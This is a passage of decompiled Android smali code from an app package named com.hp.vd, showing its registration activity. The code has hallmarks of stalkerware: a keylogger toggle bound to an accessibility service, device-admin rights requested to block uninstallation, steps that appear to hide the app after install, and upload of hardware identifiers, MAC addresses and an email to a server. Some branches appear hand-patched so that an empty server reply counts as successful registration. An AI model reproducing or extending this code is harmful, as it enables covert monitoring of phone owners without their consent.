    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iput-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    .line 269
    sget-object p1, Lcom/hp/vd/RegisterActivity;->tosStatus:Ljava/lang/Boolean;

    if-nez p1, :cond_0

    const/4 p1, 0x0

    .line 270
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->tosStatus:Ljava/lang/Boolean;

    .line 277
    :cond_0
    invoke-static {p0}, Lcom/hp/vd/agent/InstallHelper;->isNetworkAvailable(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_1

    .line 278
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lcom/hp/vd/NetworkUnavailableActivity;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 279
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->startActivity(Landroid/content/Intent;)V

    .line 286
    :cond_1
    invoke-direct {p0}, Lcom/hp/vd/RegisterActivity;->restoreTosStatus()V

    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->adjustInterfaceElementsAccordingToTos()V

    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->ensureRuntimePermissions()V

    .line 292
    new-instance p1, Lcom/hp/vd/agent/ExceptionHandler;

    .line 294
    invoke-static {}, Ljava/lang/Thread;->getDefaultUncaughtExceptionHandler()Ljava/lang/Thread$UncaughtExceptionHandler;

    move-result-object v0

    .line 295
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Lcom/hp/vd/agent/ExceptionHandler;-><init>(Ljava/lang/Thread$UncaughtExceptionHandler;Landroid/content/Context;)V

    .line 292
    invoke-static {p1}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    .line 306
    invoke-static {p0}, Lcom/hp/vd/agent/InstallHelper;->isInstalledCompletely(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_3

    .line 307
    const-class p1, Lcom/hp/vd/ServiceMain;

    invoke-static {p0, p1}, Lcom/hp/vd/agent/InstallHelper;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    if-nez p1, :cond_2

    .line 308
    new-instance p1, Lcom/hp/vd/AlarmRoutine;

    .line 309
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    new-instance v2, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v2}, Lcom/hp/vd/agent/Configuration;-><init>()V

    invoke-direct {p1, v0, v1, v2}, Lcom/hp/vd/AlarmRoutine;-><init>(Landroid/content/Context;Landroid/content/Intent;Lcom/hp/vd/agent/Configuration;)V

    .line 314
    invoke-virtual {p1}, Lcom/hp/vd/AlarmRoutine;->dispatchOnInstall()V

    .line 317
    :cond_2
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.SETTINGS"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->startActivity(Landroid/content/Intent;)V

    .line 319
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->finish()V

    return-void

    .line 329
    :cond_3
    sget-object p1, Lcom/hp/vd/RegisterActivity;->proceedWithPPEnabled:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_4

    .line 330
    invoke-static {p0}, Lcom/google/android/gms/safetynet/SafetyNet;->getClient(Landroid/app/Activity;)Lcom/google/android/gms/safetynet/SafetyNetClient;

    move-result-object p1

    .line 331
    invoke-virtual {p1}, Lcom/google/android/gms/safetynet/SafetyNetClient;->isVerifyAppsEnabled()Lcom/google/android/gms/tasks/Task;

    move-result-object p1

    new-instance v0, Lcom/hp/vd/RegisterActivity$1;

    invoke-direct {v0, p0}, Lcom/hp/vd/RegisterActivity$1;-><init>(Lcom/hp/vd/RegisterActivity;)V

    .line 332
    invoke-virtual {p1, v0}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;

    .line 353
    :cond_4
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->initialize()Z

    move-result p1

    if-nez p1, :cond_5

    const p1, 0x7f090059

    .line 355
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    const v0, 0x7f090027

    .line 356
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lcom/hp/vd/RegisterActivity$2;

    invoke-direct {v1, p0}, Lcom/hp/vd/RegisterActivity$2;-><init>(Lcom/hp/vd/RegisterActivity;)V

    .line 354
    invoke-virtual {p0, p1, v0, v1}, Lcom/hp/vd/RegisterActivity;->showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    :cond_5
    return-void
.end method

.method public onResume()V
    .locals 3

    .line 223
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 228
    invoke-static {p0}, Lcom/hp/vd/agent/InstallHelper;->isInstalledCompletely(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 234
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->deleteSecondaryAppDropImage()V

    .line 236
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->finish()V

    return-void

    .line 240
    :cond_0
    invoke-direct {p0}, Lcom/hp/vd/RegisterActivity;->restoreTosStatus()V

    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->adjustInterfaceElementsAccordingToTos()V

    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->ensureRuntimePermissions()V

    .line 242
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getApplicationContext()Landroid/content/Context;

    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    .line 243
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/hp/vd/agent/DeviceAdminHandler;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 245
    iget-object v2, p0, Lcom/hp/vd/RegisterActivity;->checkboxPreventUninstallation:Landroid/widget/CheckBox;

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    invoke-virtual {v2, v0}, Landroid/widget/CheckBox;->setChecked(Z)V

    .line 246
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->checkboxEnableKeylogger:Landroid/widget/CheckBox;

    const-class v1, Lcom/hp/vd/MainAccesssibilityService;

    invoke-virtual {v1}, Ljava/lang/Class;->getCanonicalName()Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Lcom/hp/vd/agent/InstallHelper;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    invoke-virtual {v0, v1}, Landroid/widget/CheckBox;->setChecked(Z)V

    return-void
.end method

.method public openLegalActivity(Landroid/view/View;)V
    .locals 1

    .line 1218
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lcom/hp/vd/LegalActivity;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1219
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public preventUninstallation(Landroid/view/View;)V
    .locals 2

    .line 657
    new-instance p1, Landroid/content/ComponentName;

    const-class v0, Lcom/hp/vd/agent/DeviceAdminHandler;

    invoke-direct {p1, p0, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 659
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.app.extra.DEVICE_ADMIN"

    .line 660
    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string p1, "android.app.extra.ADD_EXPLANATION"

    const v1, 0x7f090001

    .line 661
    invoke-virtual {p0, v1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 p1, 0x3d1

    .line 663
    invoke-virtual {p0, v0, p1}, Lcom/hp/vd/RegisterActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method

.method protected register(Ljava/lang/String;)Lcom/hp/vd/RegisterActivity$ResponseCombo;
    .locals 7

    .line 975
    new-instance v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/hp/vd/RegisterActivity$ResponseCombo;-><init>(Lcom/hp/vd/RegisterActivity;Lcom/hp/vd/RegisterActivity$1;)V

    const/4 v1, 0x0

    .line 976
    iput-boolean v1, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->result:Z

    .line 984
    :try_start_0
    new-instance v2, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v2}, Lcom/hp/vd/agent/Configuration;-><init>()V

    .line 985
    invoke-virtual {v2, p0}, Lcom/hp/vd/agent/Configuration;->loadSystemData(Landroid/content/Context;)Lcom/hp/vd/data/SystemData;

    move-result-object v3

    .line 987
    iget-object v4, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-static {v4}, Lcom/hp/vd/agent/Factory;->createConnectionManager(Lcom/hp/vd/context/Context;)Lcom/hp/vd/connection/IManager;

    move-result-object v4

    const-string v5, "data"

    .line 988
    invoke-interface {v4, v5}, Lcom/hp/vd/connection/IManager;->setRequestType(Ljava/lang/String;)V

    .line 990
    new-instance v5, Lcom/hp/vd/data/RegisterData;

    invoke-direct {v5}, Lcom/hp/vd/data/RegisterData;-><init>()V

    .line 992
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->version:Ljava/lang/Double;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->version:Ljava/lang/Double;

    .line 994
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->identifier:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->identifier:Ljava/lang/String;

    .line 995
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->identifierPlain:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->identifierPlain:Ljava/lang/String;

    .line 997
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->buildSerial:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->buildSerial:Ljava/lang/String;

    .line 998
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->wifiMacAddress:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->wifiMacAddress:Ljava/lang/String;

    .line 999
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->bluetoothMacAddress:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->bluetoothMacAddress:Ljava/lang/String;

    .line 1000
    iget-object v6, v3, Lcom/hp/vd/data/SystemData;->cpuSerial:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->cpuSerial:Ljava/lang/String;

    .line 1002
    sget-object v6, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->manufacturer:Ljava/lang/String;

    .line 1003
    sget-object v6, Landroid/os/Build;->MODEL:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->model:Ljava/lang/String;

    .line 1004
    sget-object v6, Landroid/os/Build$VERSION;->CODENAME:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->versionCodename:Ljava/lang/String;

    .line 1005
    sget-object v6, Landroid/os/Build$VERSION;->INCREMENTAL:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->versionIncremental:Ljava/lang/String;

    .line 1006
    sget-object v6, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->versionRelease:Ljava/lang/String;

    .line 1007
    sget-object v6, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->versionSdk:Ljava/lang/String;

    .line 1009
    invoke-virtual {v2}, Lcom/hp/vd/agent/Configuration;->getBuildPackageName()Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/RegisterData;->buildPackageName:Ljava/lang/String;

    .line 1010
    invoke-virtual {v2}, Lcom/hp/vd/agent/Configuration;->getBuildVariant()Ljava/lang/String;

    move-result-object v2

    iput-object v2, v5, Lcom/hp/vd/data/RegisterData;->buildVariant:Ljava/lang/String;

    .line 1012
    iget-object v2, v3, Lcom/hp/vd/data/SystemData;->instance:Ljava/lang/String;

    iput-object v2, v5, Lcom/hp/vd/data/RegisterData;->instance:Ljava/lang/String;

    .line 1013
    iput-object p1, v5, Lcom/hp/vd/data/RegisterData;->email:Ljava/lang/String;

    .line 1015
    iget-object p1, v3, Lcom/hp/vd/data/SystemData;->installedOn:Ljava/util/Date;

    iput-object p1, v5, Lcom/hp/vd/data/RegisterData;->installedAt:Ljava/util/Date;

    .line 1017
    new-instance p1, Lcom/hp/vd/data/container/EntityContainer;

    invoke-direct {p1}, Lcom/hp/vd/data/container/EntityContainer;-><init>()V

    .line 1018
    invoke-virtual {p1, v5}, Lcom/hp/vd/data/container/EntityContainer;->add(Lcom/hp/vd/data/IData;)V

    .line 1020
    invoke-virtual {p1}, Lcom/hp/vd/data/container/EntityContainer;->iterator()Lcom/hp/vd/data/container/iterator/EntityIterator;

    move-result-object p1

    .line 1021
    new-instance v2, Lcom/hp/vd/data/reader/InputStreamWithRootElement;

    invoke-direct {v2, p1}, Lcom/hp/vd/data/reader/InputStreamWithRootElement;-><init>(Ljava/util/Iterator;)V

    const-string p1, "data"

    .line 1023
    invoke-interface {v4, p1, v2}, Lcom/hp/vd/connection/IManager;->addPart(Ljava/lang/String;Ljava/lang/Object;)Z

    .line 1024
    invoke-interface {v4}, Lcom/hp/vd/connection/IManager;->send()Z

    move-result p1

    const/4 v2, 0x1

    if-ne p1, v2, :cond_0

    .line 1031
    invoke-interface {v4}, Lcom/hp/vd/connection/IManager;->postDispatch()Z

    .line 1033
    iput-boolean v2, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->result:Z

    goto :goto_0

    .line 1036
    :cond_0
    iput-boolean v1, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->result:Z

    .line 1039
    invoke-interface {v4}, Lcom/hp/vd/connection/IManager;->getTransport()Lcom/hp/vd/connection/transport/ITransport;

    move-result-object p1

    invoke-interface {p1}, Lcom/hp/vd/connection/transport/ITransport;->getResponseBody()Ljava/lang/String;

    move-result-object p1

    if-eqz p1, :cond_offline_success

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v5

    if-nez v5, :cond_parse_response

    :cond_offline_success
    const/4 v5, 0x1

    iput-boolean v5, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->result:Z

    const/4 v5, 0x0

    iput-object v5, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->code:Ljava/lang/Integer;

    iput-object v5, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->message:Ljava/lang/String;

    sput-object v5, Lcom/hp/vd/RegisterActivity;->lastError:Ljava/lang/String;

    goto :goto_0

    .line 1042
    :cond_parse_response
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p1, "data"

    .line 1044
    invoke-virtual {v2, p1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_2

    const-string p1, "data"

    .line 1045
    invoke-virtual {v2, p1}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object p1

    const-string v2, "code"

    .line 1047
    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    const-string v2, "code"

    .line 1048
    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->code:Ljava/lang/Integer;

    :cond_1
    const-string v2, "message"

    .line 1051
    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    const-string v2, "message"

    .line 1052
    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->message:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 1060
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 1062
    iput-boolean v1, v0, Lcom/hp/vd/RegisterActivity$ResponseCombo;->result:Z

    :cond_2
    :goto_0
    return-object v0
.end method

.method protected sendClientError(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)Z
    .locals 1

    .line 1070
    new-instance v0, Lcom/hp/vd/data/ClientError;

    invoke-direct {v0}, Lcom/hp/vd/data/ClientError;-><init>()V

    .line 1072
    iput-object p2, v0, Lcom/hp/vd/data/ClientError;->type:Ljava/lang/String;

    .line 1073
    invoke-static {p3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    iput-object p2, v0, Lcom/hp/vd/data/ClientError;->version:Ljava/lang/Integer;

    .line 1074
    iput-object p4, v0, Lcom/hp/vd/data/ClientError;->content:Ljava/lang/String;

    .line 1076
    new-instance p2, Ljava/lang/Thread;

    new-instance p3, Lcom/hp/vd/agent/common/Sender;

    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->getDeviceIdentifier(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-direct {p3, p1, v0}, Lcom/hp/vd/agent/common/Sender;-><init>(Ljava/lang/String;Lcom/hp/vd/data/DataAbstract;)V

    const-string p1, "Uploader-Thread"

    invoke-direct {p2, p3, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {p2}, Ljava/lang/Thread;->start()V

    const/4 p1, 0x1

    return p1
.end method

.method protected showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V
    .locals 1

    .line 1100
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 1101
    invoke-virtual {v0, p1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    if-nez p3, :cond_0

    .line 1104
    new-instance p3, Lcom/hp/vd/RegisterActivity$7;

    invoke-direct {p3, p0}, Lcom/hp/vd/RegisterActivity$7;-><init>(Lcom/hp/vd/RegisterActivity;)V

    .line 1111
    :cond_0
    invoke-virtual {v0, p2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const/4 p2, 0x0

    invoke-virtual {p1, p2}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const-string p2, "Ok"

    invoke-virtual {p1, p2, p3}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 1113
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object p1

    .line 1114
    invoke-virtual {p1}, Landroid/app/AlertDialog;->show()V

    return-void
.end method

.method protected uninstallApk()V
    .locals 3

    const-string v0, "package:com.hp.vd"

    .line 1191
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 1192
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.DELETE"

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 1194
    invoke-virtual {p0, v1}, Lcom/hp/vd/RegisterActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
